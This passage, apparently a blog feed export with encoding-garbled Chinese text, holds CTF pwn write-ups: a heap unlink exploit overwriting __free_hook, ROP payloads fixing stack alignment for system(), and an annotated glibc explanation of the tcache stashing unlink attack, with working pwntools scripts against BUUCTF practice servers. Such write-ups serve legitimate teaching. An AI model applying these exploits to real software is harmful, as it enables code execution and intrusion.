¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€+unlink æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥æ”¾expäº†ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28336</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_a=<span class="number">0x11A8</span></span><br><span class="line">d_d=<span class="number">0x11ba</span></span><br><span class="line">d_e=<span class="number">0x11e0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the index you want to create (0-10):&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter a size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter an index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter an index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Done!\n&#x27;)</span></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_e,d_a,d_d)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter your name: &#x27;</span>,<span class="string">b&#x27;%15$p%14$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x20830</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1200</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">ptr=base_addr+<span class="number">0x202070</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;aaaabbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;ccccdddd&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">&#x27;eeeeffff&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake_chunk+<span class="number">0x70</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\xa0&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_hook=libc_base_addr+<span class="number">0x3c67a8</span> </span><br><span class="line">sys_addr=libc_base_addr+<span class="number">0x0000000000045390</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(free_hook)+p64(<span class="number">0x20</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007182508865.png" alt="image-20221007182508865"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯¡æ”¹gotè¡¨ </tag>
            
            <tag> å †æº¢å‡º </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºubuntu18ç‰ˆæœ¬ä»¥ä¸Šè°ƒç”¨64ä½ç¨‹åºä¸­çš„systemå‡½æ•°çš„æ ˆå¯¹é½é—®é¢˜</title>
      <link href="/posts/75ba47d9.html"/>
      <url>/posts/75ba47d9.html</url>
      
        <content type="html"><![CDATA[<p>æœ‰æ—¶å€™åœ¨åš64ä½é¢˜ç›®çš„æ—¶å€™ä¼šexpå®Œå…¨æ²¡é—®é¢˜ï¼Œä½†å°±æ˜¯è·å–ä¸äº†shellã€‚ç„¶åé€šè¿‡gdbè°ƒè¯•å‘ç°æ˜¯åœ¨æœ€åçš„systemå‡½æ•°æ‰§è¡Œçš„æ—¶å€™å¡ä½äº†ï¼Œç„¶åå°±æ»¡è„¸ç–‘æƒ‘ï¼Œè¿™ä¹Ÿèƒ½å¡ï¼Ÿï¼Ÿï¼Ÿ</p><h2 id="ä¸ºä»€ä¹ˆæ‰§è¡Œsystemå‡½æ•°è¦æ ˆå¯¹é½"><a href="#ä¸ºä»€ä¹ˆæ‰§è¡Œsystemå‡½æ•°è¦æ ˆå¯¹é½" class="headerlink" title="ä¸ºä»€ä¹ˆæ‰§è¡Œsystemå‡½æ•°è¦æ ˆå¯¹é½"></a>ä¸ºä»€ä¹ˆæ‰§è¡Œsystemå‡½æ•°è¦æ ˆå¯¹é½</h2><p>å…¶å®å•Šï¼Œ<strong>64ä½ubuntu18ä»¥ä¸Šç³»ç»Ÿè°ƒç”¨systemå‡½æ•°æ—¶æ˜¯éœ€è¦æ ˆå¯¹é½çš„</strong>ã€‚å†<strong>å…·ä½“ä¸€ç‚¹å°±æ˜¯64ä½ä¸‹systemå‡½æ•°æœ‰ä¸ªmovapsæŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤è¦æ±‚å†…å­˜åœ°å€å¿…é¡»16å­—èŠ‚å¯¹é½</strong>ï¼Œå¦‚æœä½ åˆ°systemå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œsiå•æ­¥è¿›å»å°±ä¼šå‘ç°ï¼Œå¦‚æœæ²¡å¯¹é½çš„è¯ï¼Œæœ€åå°±ä¼šå¡åœ¨è¿™é‡Œï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚<br><img src="/../img/2706180-20220629161534055-1971449802.png"></p><h2 id="å¯¹é½ï¼Ÿæ€ä¹ˆæ‰ç®—å¯¹é½ï¼Ÿ"><a href="#å¯¹é½ï¼Ÿæ€ä¹ˆæ‰ç®—å¯¹é½ï¼Ÿ" class="headerlink" title="å¯¹é½ï¼Ÿæ€ä¹ˆæ‰ç®—å¯¹é½ï¼Ÿ"></a>å¯¹é½ï¼Ÿæ€ä¹ˆæ‰ç®—å¯¹é½ï¼Ÿ</h2><p>å› ä¸º64ä½ç¨‹åºçš„åœ°å€æ˜¯8å­—èŠ‚çš„ï¼Œè€Œåå…­è¿›åˆ¶åˆæ˜¯æ»¡16å°±ä¼šè¿›ä½ï¼Œå› æ­¤æˆ‘ä»¬çœ‹åˆ°çš„æ ˆåœ°å€æœ«å°¾è¦ä¹ˆæ˜¯0è¦ä¹ˆæ˜¯8ã€‚å¦‚ä¸‹å›¾</p><p><img src="/../img/2706180-20220312122451427-1700171694.png"></p><p>åªæœ‰å½“åœ°å€çš„æœ«å°¾æ˜¯0çš„æ—¶å€™ï¼Œæ‰ç®—æ˜¯ä¸16å­—èŠ‚å¯¹é½äº†ï¼Œå¦‚æœæœ«å°¾æ˜¯8çš„è¯ï¼Œé‚£å°±æ˜¯æ²¡æœ‰å¯¹é½ã€‚è€Œæˆ‘ä»¬æƒ³è¦åœ¨ubuntu18ä»¥ä¸Šçš„64ä½ç¨‹åºä¸­æ‰§è¡Œsystemå‡½æ•°ï¼Œå¿…é¡»è¦åœ¨æ‰§è¡Œsystemåœ°å€æœ«å°¾æ˜¯0ã€‚</p><p>ä¸‹é¢ä¸¤ä¸ªå›¾ï¼Œåˆ†åˆ«æ˜¯æ²¡å¯¹é½å’Œå¯¹é½çš„æƒ…å†µã€‚</p><p><img src="/../img/2706180-20220312122500759-1557162145.png"></p><p><img src="/../img/2706180-20220312122510505-529221181.png"></p><h2 id="å¦‚æœæ‰§è¡Œsystemçš„æ—¶å€™æ²¡æœ‰å¯¹é½æ€ä¹ˆåŠï¼Ÿ"><a href="#å¦‚æœæ‰§è¡Œsystemçš„æ—¶å€™æ²¡æœ‰å¯¹é½æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="å¦‚æœæ‰§è¡Œsystemçš„æ—¶å€™æ²¡æœ‰å¯¹é½æ€ä¹ˆåŠï¼Ÿ"></a>å¦‚æœæ‰§è¡Œsystemçš„æ—¶å€™æ²¡æœ‰å¯¹é½æ€ä¹ˆåŠï¼Ÿ</h2><p>å¦‚æœ<strong>æ‰§è¡Œäº†ä¸€ä¸ªå¯¹æ ˆåœ°å€çš„æ“ä½œæŒ‡ä»¤</strong>ï¼ˆæ¯”å¦‚pop,ret,pushç­‰ç­‰ï¼Œä½†å¦‚æœæ˜¯movè¿™æ ·çš„åˆ™ä¸ç®—å¯¹æ ˆçš„æ“ä½œæŒ‡ä»¤ï¼‰ï¼Œé‚£ä¹ˆ<strong>æ ˆåœ°å€å°±ä¼š+8æˆ–æ˜¯-8</strong>ã€‚<strong>ä¸ºä½¿rspå¯¹é½16å­—èŠ‚ï¼Œæ ¸å¿ƒæ€æƒ³å°±æ˜¯å¢åŠ æˆ–å‡å°‘æ ˆå†…å®¹ï¼Œä½¿rspåœ°å€èƒ½ç›¸åº”çš„å¢åŠ æˆ–å‡å°‘8å­—èŠ‚ï¼Œè¿™æ ·å°±èƒ½å¤Ÿå¯¹é½16å­—èŠ‚äº†ã€‚å› ä¸ºæ ˆä¸­åœ°å€éƒ½æ˜¯ä»¥0æˆ–8ç»“å°¾ï¼Œ0å·²ç»å¯¹é½16å­—èŠ‚ï¼Œå› æ­¤åªéœ€è¦è¿›è¡Œå¥‡æ•°æ¬¡popæˆ–pushæ“ä½œï¼Œå°±èƒ½æŠŠåœ°å€æ˜¯8ç»“å°¾çš„rspå˜ä¸º0ç»“å°¾ï¼Œä½¿å…¶16å­—èŠ‚å¯¹é½ã€‚</strong></p><p>è¿™æ—¶å€™æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ã€‚</p><p>1ã€å»å°†systemå‡½æ•°åœ°å€+1ï¼Œ<strong>æ­¤å¤„çš„+1ï¼Œå³æ˜¯æŠŠåœ°å€+1ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸º</strong></p><p><strong>+1æ˜¯ä¸ºäº†è·³è¿‡ä¸€æ¡æ ˆæ“ä½œæŒ‡ä»¤ï¼ˆæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è·³è¿‡ä¸€æ¡æ ˆæ“ä½œæŒ‡ä»¤ï¼Œä½¿rspåå…­å­—èŠ‚å¯¹é½</strong>ï¼Œ<strong>è·³è¿‡ä¸€æ¡æŒ‡ä»¤ï¼Œè‡ªç„¶å°±æ˜¯æŠŠ8å˜æˆ0äº†</strong>ï¼‰ã€‚ä½†åˆä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œæœ¬æ¥+1æ˜¯ä¸ºäº†è·³è¿‡ä¸€æ¡æ ˆæ“ä½œæŒ‡ä»¤ï¼Œä½†æ˜¯ä½ ä¹Ÿä¸çŸ¥é“ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯ä¸æ˜¯æ ˆæ“ä½œæŒ‡ä»¤ï¼Œå¦‚æœä¸æ˜¯æ ˆæ“ä½œæŒ‡ä»¤çš„è¯ï¼ˆä½ åŠ ä¸€ä¹‹åæœ‰å¯èƒ½æ­£å¥½æ˜¯movè¿™ç§æŒ‡ä»¤ï¼Œä¹Ÿæœ‰å¯èƒ½äººå®¶æŒ‡ä»¤æ˜¯å¥½å‡ ä¸ªå­—èŠ‚ï¼Œä½ åŠ ä¸€ä¹‹åä¹Ÿæ²¡æœ‰åˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤å‘¢ï¼‰ï¼Œ+1ä¹Ÿæ˜¯å¾’åŠ³çš„ï¼Œè¦ä¹ˆå°±ç»§ç»­+1ï¼Œä¸€ç›´åŠ åˆ°é‡è§ä¸€æ¡æ ˆæ“ä½œæŒ‡ä»¤ä¸ºæ­¢ï¼ˆçœ‹åˆ«çš„å¸ˆå‚…è¯´æœ€å¤§åŠ 16æ¬¡å°±èƒ½æˆåŠŸï¼Œä¸è¿‡æˆ‘ä¸çŸ¥é“ä¸ºå•¥ï¼‰</p><p><img src="/../img/2706180-20220312122522900-1221918873.png"></p><p><strong>å¯ä»¥çœ‹è§æœ¬æ¥æˆ‘ä»¬åº”è¯¥æ˜¯ç”¨401186è¿™ä¸ªåœ°å€çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨è¦è·³è¿‡ä¸€æ¡æŒ‡ä»¤ï¼Œé‚£è‡ªç„¶å°±æ˜¯ç”¨401187ï¼Œè¿™æ ·å°±è·³è¿‡äº†push rbpè¿™æ¡æŒ‡ä»¤ã€‚</strong></p><p>2ã€ç›´æ¥åœ¨è°ƒç”¨systemå‡½æ•°åœ°å€ä¹‹å‰å»è°ƒç”¨ä¸€ä¸ªretæŒ‡ä»¤ã€‚å› ä¸ºæœ¬æ¥ç°åœ¨æ˜¯æ²¡æœ‰å¯¹é½çš„ï¼Œé‚£æˆ‘ç°åœ¨ç›´æ¥æ‰§è¡Œä¸€æ¡å¯¹æ ˆæ“ä½œæŒ‡ä»¤ï¼ˆretæŒ‡ä»¤ç­‰åŒäºpop ripï¼Œè¯¥æŒ‡ä»¤ä½¿å¾—rsp+8ï¼Œä»è€Œå®Œæˆrsp16å­—èŠ‚å¯¹é½ï¼‰ï¼Œè¿™æ ·systemåœ°å€æ‰€åœ¨çš„æ ˆåœ°å€å°±æ˜¯0ç»“å°¾ï¼Œä»è€Œå®Œæˆäº†æ ˆå¯¹é½ã€‚</p><p>å› æ­¤payloadæœ‰ä¸¤ç§æ”¹æ³•ï¼ˆä¸‹é¢æˆ‘æ˜¯ä»¥BUUCTFä¸Šçš„ripé¢˜ç›®çš„expä¸ºä¾‹ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#åŠ 1å»è·³è¿‡ä¸€ä¸ªæ ˆæ“ä½œæŒ‡ä»¤ï¼Œä½¿å…¶å¯¹é½16å­—èŠ‚</span></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;please input&quot;)#è¿™é‡Œç”¨recvuntilä¼šæŠ¥è¿æ¥è¶…æ—¶ï¼Œå› ä¸ºncä¸Šå»å‘ç°æœåŠ¡å™¨é‚£è¾¹çš„ç¨‹åºä¸Šæ²¡æœ‰æ‰“å°è¿™å¥è¯</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28002</span>)</span><br><span class="line">payload=<span class="number">23</span>*<span class="string">&#x27;A&#x27;</span>+p64(<span class="number">0x401016</span>)+p64(<span class="number">0x401186</span>)+p64(<span class="number">0</span>)<span class="comment">#0x401016æ˜¯ä¸€ä¸ªretæŒ‡ä»¤ï¼Œ p64(0)æ˜¯systemå‡½æ•°çš„è¿”å›åœ°å€</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¢ç©¶ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ˆå¯¹é½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºtcache stashing unlink attackçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/12414989.html"/>
      <url>/posts/12414989.html</url>
      
        <content type="html"><![CDATA[<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><blockquote><p>ä»‹ç»ï¼šåœ¨2.29çš„libcç‰ˆæœ¬ä¸­ï¼Œè¿›è¡Œäº†unsorted binçš„åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ã€‚å› æ­¤unsorted bin attackä¹Ÿå°±å¤±æ•ˆäº†ï¼Œä¸è¿‡åœ¨libc2.29çš„ç‰ˆæœ¬ä¸­tcache stashing unlink attackå´å¯ä»¥è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœ(åœ¨ä¸€ä¸ªä»»æ„åœ°å€å†™å…¥ä¸€ä¸ªlibcåœ°å€)ã€‚</p><p>åŸç†ï¼šåœ¨2.29çš„libcä¸­ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦çš„chunkä½äºäº†small biné‡Œé¢ï¼Œå½“æˆ‘ä»¬å°†chunkä»small binæ‹¿å‡ºæ¥çš„æ—¶å€™ï¼Œè¿˜ä¼šå»æ£€æŸ¥å½“å‰small biné“¾ä¸Šæ˜¯å¦è¿˜æœ‰å‰©ä½™å †å—ï¼Œå¦‚æœæœ‰çš„è¯å¹¶ä¸”tcache binçš„é“¾ä¸Šè¿˜æœ‰ç©ºä½™ä½ç½®(<strong>tcache binä¸èƒ½ä¸ºç©º</strong>)ï¼Œå°±ä¼šå°†å‰©ä½™çš„é‚£ä¸ªå †å—ç»™é“¾å…¥åˆ°tcache binä¸­ã€‚<strong>è€Œå°†small binä¸­çš„å †å—é“¾å…¥åˆ°tcache binä¸­çš„æ—¶å€™æ²¡æœ‰è¿›è¡ŒåŒå‘é“¾è¡¨å®Œæ•´æ€§çš„æ£€æŸ¥ï¼Œæ­¤æ—¶æ”»å‡»é‚£ä¸ªå³å°†é“¾å…¥tcache binçš„å †å—çš„bkæŒ‡é’ˆï¼Œå³å¯å‘ä»»æ„åœ°å€å†™å…¥ä¸€ä¸ªlibcåœ°å€ã€‚</strong></p><p>æ³¨æ„ï¼šä¸Šè¿°æœ‰ä¸€ä¸ªçœ‹ä¼¼çŸ›ç›¾çš„åœ°æ–¹ï¼Œå¦‚æœtcache binä¸ä¸ºç©ºå¹¶ä¸”æ²¡æœ‰æ»¡ï¼Œæ‰ä¼šå°†small biné‡Œçš„å †å—ç»™é“¾è¿›æ¥ï¼Œä½†æ˜¯tcache binä¸ä¸ºç©ºçš„è¯ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä¼šç›´æ¥ä»tcahce biné‡Œå–ï¼Œå¹¶éå»small biné‡Œæ‰¾ã€‚ä½†æ˜¯<strong>callocå‡½æ•°æœ‰ä¸ªç‰¹æ€§ï¼Œå®ƒä¸ä¼šä»tcache biné‡Œå–å †å—ï¼Œå› æ­¤è¯¥æ”»å‡»å¿…é¡»è¦åˆ©ç”¨callocå‡½æ•°æ‰è¡Œ</strong>ã€‚</p><p><strong>é€‚ç”¨ç‰ˆæœ¬ï¼šç›®å‰é€‚ç”¨äºæ‰€æœ‰å¸¦tcacheçš„glibcç‰ˆæœ¬(2.26â€“2.36)</strong></p><p>ä½¿ç”¨å‰æï¼š</p><ol><li>èƒ½ä½¿ç”¨callocåˆ†é…å †å—</li><li>å¯ä»¥æ§åˆ¶small binä¸­çš„bkæŒ‡é’ˆ</li><li>small binä¸­æœ€å°‘è¦æœ‰ä¸¤ä¸ªå †å—</li></ol><p>æ”»å‡»æ•ˆæœï¼šåœ¨ä»»æ„åœ°å€å†™ä¸€ä¸ªLibcåœ°å€(main_arena+96)</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>å…ˆè¿›è¡Œlibcåœ°å€ä»¥åŠå †åœ°å€çš„æ³„éœ²(libcåœ°å€ä¸æ˜¯å¿…é¡»çš„ï¼Œè€Œå †åœ°å€æ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ªé€ bkæŒ‡é’ˆçš„æ—¶å€™ï¼Œä¸èƒ½ç ´åfdæŒ‡é’ˆï¼Œéœ€è¦è·å–å †åœ°å€ï¼Œé‡æ–°è¿˜åŸfdæŒ‡é’ˆ)</li><li>ç„¶åå°†tcache binä¸­åªç•™6ä¸ªå †å—<strong>(è¿™æ ·small biné“¾å…¥tcache binåï¼Œtcache binå°±ä¼šç›´æ¥è£…æ»¡ï¼Œé˜²æ­¢ç¨‹åºç»§ç»­é€šè¿‡æˆ‘ä»¬ç¯¡æ”¹çš„bkæŒ‡é’ˆç»§ç»­å¾€ä¸‹éå†)</strong></li><li>å†åšå‡ºè‡³å°‘ä¸¤ä¸ªä½äºsmall binä¸­çš„chunk(å¯ä»¥é€šè¿‡åˆ‡å‰²unsorted binçš„æ–¹å¼ï¼Œè®©å‰©ä½™éƒ¨åˆ†çš„å †å—è¿›å…¥small binæˆ–è€…å½“éå†unsorted binçš„æ—¶å€™ï¼Œä¼šç»™å †å—åˆ†ç±»ï¼Œè®©å…¶å°å †å—è¿›å…¥small binä¸­)</li><li>åˆ©ç”¨æº¢å‡ºæˆ–UAF+editç­‰æ‰‹æ®µï¼Œç¯¡æ”¹ä½äºsmall binä¸­çš„å€’æ•°ç¬¬äºŒä¸ªå †å—çš„bkæŒ‡é’ˆä¸ºæˆ‘ä»¬æƒ³è¦å†™å…¥main_arena+96çš„åœ°å€ <strong>æ³¨æ„ä¼ªé€ bkçš„æ—¶å€™ä¸€å®šä¸èƒ½ç ´åfdæŒ‡é’ˆ</strong></li><li>æœ€åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªä½äºsmall biné‚£æ¡é“¾å¯¹åº”sizeä¸­çš„chunkï¼Œ<strong>å°†small binä¸­çš„ä¸€ä¸ªchunkç”³è¯·å‡ºæ¥ï¼Œè€Œsmall biné“¾ä¸­çš„å¦ä¸€ä¸ªå †å—åˆ™è¿›å…¥tcache binï¼Œåœ¨é“¾å…¥tcache binçš„æœŸé—´è§¦å‘äº†tcache stashing unlink attackã€‚</strong></li></ol></blockquote><p>è¯¥æ¼æ´å¤„çš„æºç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      <span class="comment">//victimå°±æ˜¯è¦è„±é“¾çš„å †å—ï¼Œä¹Ÿå°±æ˜¯small biné‡Œçš„æœ€åä¸€ä¸ª</span></span><br><span class="line">      <span class="comment">//è¿™ä¸ªifåœ¨åˆ¤æ–­æˆ‘ä»¬æ‰€éœ€è¦çš„sizeçš„é‚£æ¡small biné“¾ä¸Šæ˜¯å¦å­˜åœ¨å †å—ï¼Œå­˜åœ¨çš„è¯å°±æŠŠvictimç»™è„±é“¾</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//å¯¹small binçš„åŒå‘é“¾è¡¨çš„å®Œæ•´æ€§åšäº†æ£€æŸ¥ï¼Œç¡®ä¿victim-&gt;bk-&gt;fdæŒ‡å‘çš„è¿˜æ˜¯victim</span></span><br><span class="line">    <span class="comment">//å¦‚æœæˆ‘ä»¬åœ¨è¿™é‡ŒåŠ«æŒäº†victimçš„bkæŒ‡é’ˆï¼Œå°±ä¼šå¯¼è‡´bckçš„fdæŒ‡å‘çš„å¹¶ä¸æ˜¯victimï¼Œä»è€Œè§¦å‘å¼‚å¸¸</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);<span class="comment">//è®¾ç½®ä¸‹ä¸€ä¸ªï¼ˆé«˜åœ°å€ï¼‰chunkçš„prev_inuseä½</span></span><br><span class="line">          bin-&gt;bk = bck;<span class="comment">//å°†victimè„±é“¾</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//è·å–sizeå¯¹åº”çš„tcacheç´¢å¼•</span></span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//å¦‚æœè¿™ä¸ªç´¢å¼•åœ¨tcache binçš„èŒƒå›´é‡Œï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªsizeå±äºtcache binçš„èŒƒå›´</span></span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//å¦‚æœtcache binæ²¡æœ‰æ»¡</span></span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//å¦‚æœsmall binä¸ä¸ºç©º,tc_victimä¸ºsmall binä¸­çš„æœ€åä¸€ä¸ªå †å—</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;<span class="comment">//è¿™é‡Œå–tc_victimçš„bkæŒ‡é’ˆï¼Œå¹¶æ²¡æœ‰é’ˆå¯¹bckåšåŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å»æ”»å‡»tc_victimçš„bkæŒ‡é’ˆ</span></span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;<span class="comment">//å°†tc_victimä»small binä¸­è„±é“¾</span></span><br><span class="line">      bck-&gt;fd = bin;<span class="comment">//å¦‚æœæˆ‘ä»¬ä¼ªé€ bckï¼Œè¿™é‡Œå°±å¯ä»¥å°†bck-&gt;fdçš„ä½ç½®å†™å…¥ä¸€ä¸ªbinçš„åœ°å€(main_arena+96)</span></span><br><span class="line">      tcache_put (tc_victim, tc_idx);<span class="comment">//å°†tc_victimé“¾å…¥tc_idxè¿™æ¡é“¾</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="ç›¸å…³é¢˜ç›®"><a href="#ç›¸å…³é¢˜ç›®" class="headerlink" title="ç›¸å…³é¢˜ç›®"></a>ç›¸å…³é¢˜ç›®</h2><h3 id="buu-2020-æ–°æ˜¥çº¢åŒ…é¢˜-3"><a href="#buu-2020-æ–°æ˜¥çº¢åŒ…é¢˜-3" class="headerlink" title="buu[2020 æ–°æ˜¥çº¢åŒ…é¢˜]3"></a>buu[2020 æ–°æ˜¥çº¢åŒ…é¢˜]3</h3><h4 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" 